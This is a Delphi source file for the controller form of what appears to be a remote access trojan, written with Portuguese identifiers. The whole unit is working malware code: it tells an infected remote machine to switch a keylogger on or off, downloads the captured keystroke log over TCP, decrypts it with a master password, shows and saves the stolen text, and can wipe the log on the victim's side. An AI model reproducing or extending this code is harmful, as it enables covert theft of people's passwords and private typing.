unit UnitKeylogger;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, StdCtrls, ExtCtrls, UnitPrincipal, IdThreadMgr, IdThreadMgrDefault, IdAntiFreezeBase, IdAntiFreeze,
  IdBaseComponent, IdComponent, IdTCPServer;

type
  TFormKeylogger = class(TForm)
    Panel1: TPanel;
    ProgressBar1: TProgressBar;
    Memo1: TMemo;
    Button1: TButton;
    StatusBar1: TStatusBar;
    Button2: TButton;
    Button3: TButton;
    SaveDialog1: TSaveDialog;
    Button4: TButton;
    procedure FormShow(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
  private
    { Private declarations }
    Servidor: PConexao;
  public
    { Public declarations }
    NomePC: string;
    function MyReplaceString(MyString: string): string;
    procedure OnRead(Recebido: String; AThread: TIdPeerThread); overload;
    constructor Create(aOwner: TComponent; ConAux: PConexao);overload;
  end;

var
  FormKeylogger: TFormKeylogger;
  AThreadTransfer: TIdPeerThread;
  
implementation

{$R *.dfm}

uses
  UnitComandos,
  UnitStrings,
  UnitConexao,
  FuncoesDiversasCliente,
  UnitCryptString,
  UnitDiversos;

constructor TFormKeylogger.Create(aOwner: TComponent; ConAux: PConexao);
begin
  inherited Create(aOwner);
  Servidor := ConAux;
end;

function TFormKeylogger.MyReplaceString(MyString: string): string;
begin
  result := MyString;
  if pos('´a', MyString) > 0 then MyString := ReplaceString('´a', 'á', MyString);
  if pos('´A', MyString) > 0 then MyString := ReplaceString('´A', 'Á', MyString);
  if pos('`a', MyString) > 0 then MyString := ReplaceString('`a', 'à', MyString);
  if pos('`A', MyString) > 0 then MyString := ReplaceString('`A', 'À', MyString);
  if pos('~a', MyString) > 0 then MyString := ReplaceString('~a', 'ã', MyString);
  if pos('~A', MyString) > 0 then MyString := ReplaceString('~A', 'Ã', MyString);
  if pos('^a', MyString) > 0 then MyString := ReplaceString('^a', 'â', MyString);
  if pos('^A', MyString) > 0 then MyString := ReplaceString('^A', 'Â', MyString);
  if pos('¨a', MyString) > 0 then MyString := ReplaceString('¨a', 'ä', MyString);
  if pos('¨A', MyString) > 0 then MyString := ReplaceString('¨A', 'Ä', MyString);

  if pos('´e', MyString) > 0 then MyString := ReplaceString('´e', 'é', MyString);
  if pos('´E', MyString) > 0 then MyString := ReplaceString('´E', 'É', MyString);
  if pos('^e', MyString) > 0 then MyString := ReplaceString('^e', 'ê', MyString);
  if pos('^E', MyString) > 0 then MyString := ReplaceString('^E', 'Ê', MyString);
  if pos('`e', MyString) > 0 then MyString := ReplaceString('`e', 'è', MyString);
  if pos('`E', MyString) > 0 then MyString := ReplaceString('`E', 'È', MyString);
  if pos('¨e', MyString) > 0 then MyString := ReplaceString('¨e', 'ë', MyString);
  if pos('¨E', MyString) > 0 then MyString := ReplaceString('¨E', 'Ë', MyString);

  if pos('´i', MyString) > 0 then MyString := ReplaceString('´i', 'í', MyString);
  if pos('´I', MyString) > 0 then MyString := ReplaceString('´I', 'Í', MyString);
  if pos('`i', MyString) > 0 then MyString := ReplaceString('`i', 'ì', MyString);
  if pos('`I', MyString) > 0 then MyString := ReplaceString('`I', 'Ì', MyString);
  if pos('^i', MyString) > 0 then MyString := ReplaceString('^i', 'î', MyString);
  if pos('^I', MyString) > 0 then MyString := ReplaceString('^I', 'Î', MyString);
  if pos('¨i', MyString) > 0 then MyString := ReplaceString('¨i', 'ï', MyString);
  if pos('¨I', MyString) > 0 then MyString := ReplaceString('¨I', 'Ï', MyString);

  if pos('´o', MyString) > 0 then MyString := ReplaceString('´o', 'ó', MyString);
  if pos('´O', MyString) > 0 then MyString := ReplaceString('´O', 'Ó', MyString);
  if pos('~o', MyString) > 0 then MyString := ReplaceString('~o', 'õ', MyString);
  if pos('~O', MyString) > 0 then MyString := ReplaceString('~O', 'Õ', MyString);
  if pos('`o', MyString) > 0 then MyString := ReplaceString('`o', 'ò', MyString);
  if pos('`O', MyString) > 0 then MyString := ReplaceString('`O', 'Ò', MyString);
  if pos('^o', MyString) > 0 then MyString := ReplaceString('^o', 'ô', MyString);
  if pos('^O', MyString) > 0 then MyString := ReplaceString('^O', 'Ô', MyString);
  if pos('¨o', MyString) > 0 then MyString := ReplaceString('¨o', 'ö', MyString);
  if pos('¨O', MyString) > 0 then MyString := ReplaceString('¨O', 'Ö', MyString);

  if pos('´u', MyString) > 0 then MyString := ReplaceString('´u', 'ú', MyString);
  if pos('´U', MyString) > 0 then MyString := ReplaceString('´U', 'Ú', MyString);
  if pos('`u', MyString) > 0 then MyString := ReplaceString('`u', 'ù', MyString);
  if pos('`U', MyString) > 0 then MyString := ReplaceString('`U', 'Ù', MyString);
  if pos('^u', MyString) > 0 then MyString := ReplaceString('^u', 'û', MyString);
  if pos('^U', MyString) > 0 then MyString := ReplaceString('^U', 'Û', MyString);
  if pos('¨u', MyString) > 0 then MyString := ReplaceString('¨u', 'ü', MyString);
  if pos('¨U', MyString) > 0 then MyString := ReplaceString('¨U', 'Ü', MyString);

  Result := MyString;
end;

procedure TFormKeylogger.OnRead(Recebido: String; AThread: TIdPeerThread);
var
  TempStr, TempStr1: string;
  SizeFile: int64;
  OndeSalvar: string;
  c: cardinal;
begin
  if copy(recebido, 1, pos('|', recebido) - 1) = KEYLOGGER then
  begin
    delete(recebido, 1, pos('|', recebido));
    if copy(recebido, 1, pos('|', recebido) - 1) = KEYLOGGERDESATIVAR then button4.Caption := traduzidos[284] else
    if copy(recebido, 1, pos('|', recebido) - 1) = KEYLOGGERATIVAR then button4.Caption := traduzidos[285] else
    if copy(recebido, 1, pos('|', recebido) - 1) = KEYLOGGERVAZIO then
    begin
      memo1.Clear;
    end;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = KEYLOGGERGETLOG then
  begin
    application.ProcessMessages;

    AThreadTransfer := Athread;

    Delete(recebido, 1, Pos('|', recebido));
    SizeFile := StrToInt(Copy(recebido, 1, Pos('|', recebido) - 1));
    ForceDirectories(ExtractFilePath(ParamStr(0)) + 'Downloads\' + NomePC + '\');
    OndeSalvar := ExtractFilePath(ParamStr(0)) + 'Downloads\' + NomePC + '\klog.txt'; // onde será salvo o log
    MyDeleteFile(OndeSalvar);

    progressbar1.Max := sizefile;
    progressbar1.Position := 0;

    sleep(1000);
    ReceberArquivo(SizeFile, OndeSalvar, AThread, progressbar1);
    AThread.Connection.Disconnect;

    memo1.Lines.BeginUpdate;
    Memo1.Clear;
    TempStr := LerArquivo(OndeSalvar, c);
    while tempstr <> '' do
    begin
      TempStr1 := TempStr1 + EnDecrypt02(copy(tempstr, 1, pos('####', tempstr) - 1), MasterPassword);
      delete(tempstr, 1, pos('####', tempstr) - 1);
      delete(tempstr, 1, 4);
    end;
    memo1.Text := TempStr1;
    memo1.Text := MyReplaceString(Memo1.Text);
    memo1.Lines.EndUpdate;
    button1.Caption := traduzidos[280]
  end else


end;

procedure TFormKeylogger.FormShow(Sender: TObject);
begin
  ProgressBar1.Position := 0;
  Memo1.Clear;
  Statusbar1.Panels.Items[0].Text := '';
  Button1.Caption := traduzidos[280];
  Button2.Caption := traduzidos[32];
  Button3.Caption := traduzidos[115];
  Button4.Caption := traduzidos[283];
  sleep(10);
  EnviarString(Servidor.Athread, KEYLOGGER + '|', true);
end;

procedure TFormKeylogger.Button3Click(Sender: TObject);
var
  TextFile: string;
begin
  savedialog1.Filter := 'Text Files (*.txt)' + '|*.txt';
  savedialog1.InitialDir := ExtractFilePath(paramstr(0));
  savedialog1.Title := Application.Title + ' ' + VersaoPrograma;
  savedialog1.FileName := FormKeylogger.Caption + '.txt';

  if savedialog1.Execute = false then exit;
  TextFile := savedialog1.FileName;
  if extractfileext(TextFile) <> '.txt' then TextFile := TextFile + '.txt';

  memo1.Lines.SaveToFile(TextFile);
end;

procedure TFormKeylogger.Button1Click(Sender: TObject);
begin
  if button1.Caption = traduzidos[280] then
  begin
    Button1.Caption := traduzidos[281];
    EnviarString(Servidor.Athread, KEYLOGGERGETLOG + '|', true);
  end else
  begin
    Button1.Caption := traduzidos[280];
    if AThreadTransfer <> nil then try AThreadTransfer.Connection.Disconnect; except end;
  end;
end;

procedure TFormKeylogger.Button2Click(Sender: TObject);
begin
  if messagedlg(pchar(traduzidos[282]), mtConfirmation, [mbYes, mbNo], 0) = IdNo then exit;
  EnviarString(Servidor.Athread, KEYLOGGERERASELOG + '|', true);
end;

procedure TFormKeylogger.Button4Click(Sender: TObject);
begin
  if button4.Caption = traduzidos[283] then exit else
  if button4.Caption = traduzidos[284] then
  begin
    button4.Caption := traduzidos[285];
    EnviarString(Servidor.Athread, KEYLOGGERATIVAR + '|', true);
  end else
  begin
    button4.Caption := traduzidos[284];
    EnviarString(Servidor.Athread, KEYLOGGERDESATIVAR + '|', true);
  end;
end;

procedure TFormKeylogger.FormClose(Sender: TObject;
  var Action: TCloseAction);
begin
  if AThreadTransfer <> nil then try AThreadTransfer.Connection.Disconnect; except end;
end;

end.
